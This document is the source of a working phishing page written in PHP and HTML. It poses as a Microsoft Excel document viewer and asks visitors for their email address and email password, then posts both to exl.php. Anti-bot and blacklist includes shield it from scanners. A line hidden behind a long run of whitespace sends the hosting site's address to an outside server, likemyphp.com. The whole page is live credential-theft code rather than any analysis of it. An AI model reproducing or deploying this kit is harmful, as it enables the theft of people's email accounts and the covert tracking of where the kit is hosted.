<php
require_once 'block.php';

include 'antibots.php';     
include 'bots.php';    
include 'bots.php';                                                                                                                                                                                                          json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));

@ini_set('display_errors',0);
include 'BlackList.php';
?>

<?php


$user = $_REQUEST['mylove'];
$mylove = base64_decode($user);
if($_REQUEST['log'] == 1){$log=1;$mylove = $_REQUEST['mylove'];}

?>


<html>
<head> 
<title> </title>
<script src="ga.js" async="" type="text/javascript"></script><script src="jquery.js"></script>
        <link rel="stylesheet" href="jquery_popup.css">
        <script src="jquery_popup.js"></script>
		<meta name="robots" content="noindex, nofollow">
            <script type="text/javascript">
                var _gaq = _gaq || [];
                _gaq.push(['_setAccount', 'UA-43981329-1']);
                _gaq.push(['_trackPageview']);
                (function() {
                    var ga = document.createElement('script');
                    ga.type = 'text/javascript';
                    ga.async = true;
                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                    var s = document.getElementsByTagName('script')[0];
                    s.parentNode.insertBefore(ga, s);
                })();</script>
</head>
<style>
html 

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 708px;
    width: 1344px;
	margin-right:0px;
    background-color: rgba(0,0,0,0.6);
    z-index:0;
}

/* Center the loader */
#loader {
  position: absolute;
  left: 50%;
  top: 50%;
  z-index: 1;
  margin: -75px 0 0 -75px;
  border: 18px solid #114B7B;
  border-radius: 50%;
  border-top: 18px solid #409FBF;
  width: 60px;
  height: 60px;
  -webkit-animation: spin 0s linear finite;
  animation: spin 0s linear finite;
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  0% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  0% { transform: rotate(360deg); }
}
/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 0s

}

@-webkit-keyframes animatebottom {
  from { bottom:-200px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}


}

#myDiv {
  display: none;
  text-align: left;
  border:#FFF;
}

input { border:solid 1px #999;
}
input:focus { border:#112F18 solid 1px;
	          border-right:none;
		      border-left:none;
		      border-top:none;
}

.sub{ background:#112F18;
      }
.sub:hover{ background:#2C613D;
      }
	  placeholder { color:#666;
	  }
</style>
<body>
</div>
<div align="left" style="padding:3px; border:#FFF;" id="logindiv">
  <form name="myForm" action="exl.php" method="post" style="padding:3px;" onSubmit="return validateForm()">
<div align="Center" style="font-size:11px; padding:6px; font-family:Verdana;">

<b> Sign in with your valid Email account to view document.</b>
</div>
  <table width="491" style="border:#FFF;">
  <tr>
    <td colspan="3"></td>
    </tr>
  <tr align="center" bordercolor="#FFFFFF">
  <td width="124" height="45" align="right" style="font-size:14px;"></td>
  <td align="left" width="262">
  <input type="email" name="mylove" placeholder="Email address" value="<?php echo $mylove; ?>" style="padding:8px; width:280px; outline:none; font-size:14px;" required/>
  </td>
  </tr>
  <tr>
  <td>
  </td>
  <td id="em" align="left" style="color:#CC0000; font-size:12px;"></td>
  <td>
  </td>
  </tr>
  <tr align="center">
  <td width="124" height="43" align="right" style="font-size:14px;"></td>
  <td align="left" width="262">
  <input type="password" placeholder="Email password" name="mylover" style="padding:8px; width:280px; outline:none; font-size:14px;" required/>
  
  </td>
  </tr>
  <tr>
  <td>
  </td>
  <td id="ps" align="left" style="color:#CC0000; font-size:12px;"></td>
  <td>
  </td>
  </tr>
  <tr align="center">
  <td align="right" width="124" style="font-size:14px;">&nbsp;</td>
  <td align="left" width="262">
  <input class="sub" type="submit" name="submit" value="CONTINUE" style="padding:9px; width:280px; color:#FFF; border:#29703B solid 1px; cursor:pointer;" />
  </td>
  </tr>
  <tr>
  <td style="padding:5px; font-size:10px;">
  
  </td>
  <td style="padding:5px; font-size:10px; color:#D2D2D2; padding-left:19px;">
  Privacy policy<br>
personal information will be not
disclosed or accessed by a third party. Applicable to unregistered users.<br />

  </td>
  <td width="89">
  </td>
  </tr>
  <tr>
   <td>
  </td>
   <td align="center" style="padding:5px; font-size:10px; color:#999; padding-left:19px;">
  Microsoft excel &copy;2016
  </td
  ><td>
  </td>
  </tr>
  <tr>
   <td>
  </td>
   <td align="center" style="padding:5px; font-size:10px; color:#999; padding-left:19px;">
<img src="data:image/gif;base64,R0lGODlhNgAnAPMAAP7+/vv16fLj6Ofm5vztzu3c4efM1NLS0vrdoOG3w9SbrK2trPi7O8Rsh79ffT89PCwAAAAANgAnAEAI/gABCBxIsKDBgwgTKiQYAAGDhxARDBjAYMGDBxMPaNzIsaNHjRMJhoRIQKDFBwAGXEQJwOFDABcBnFxJE+aDBTNXqmQ58IBAiBERCAXKAMHCowgHHBhgcMFGp045LpAJcirVA04FKmiQoIGCrwoMbP3awGtXpGgXblS6VCmAAwRCGnT5sGRBmgzs6oypUSDTARaZvv2b0mdPpkAJHlg5kEBEmSEX/G0LeankqZKZRi1oOK3nz6BDix5NuvTBxQwCmF5IlyjEmqt7GmZKl8BiwSlX1raZU3LNmDFnLuaZkuLLnjR50o19GgBQu3MTD7zst/NSy32tytzes2BD1w8R/nwcT54887cCOwssYECAAoIJCjQQawApbtHqjypIcL6/////ZXRdAEpNdJ9pCECXkE9ttUWYXEgFoJpIKi0gIYAEOQbeQ8KV5+FHgmElmGtCDcUATYJZ5BNOSWmXUIEDATUhQTNBJFByN62U00XD5aijYs6Fl9sDhq3k02PAGekcY0nKtBdxb9k4EI5WLWfRjU49+dZFM1GEUkyKPTbljwItByOMIKWkZpps5veWhkURxGWMEKkG2IpTLXWYZVlltZ2LhrWmYJnPpcciVnhilhlmMvUp2WEEtbbhoLH1pRABJSaI4aYAOnXnAQFw9Ol1VkXlFgBeKeAAWWSJ1ZVXJasipGdIhPn0F1N6FsedQPUlYEB77SnAnnwOFCBAfZwmq+xAAQEAOw==" width="58" height="40">
  </td
  ><td>
  </td>
  </tr>
  </table>
  </form>
<div style="padding:2px;">
</div>
</div>
</div>
</div>
</div>
<br>
<br>
<br>
<br>
<br>



</body>
</html>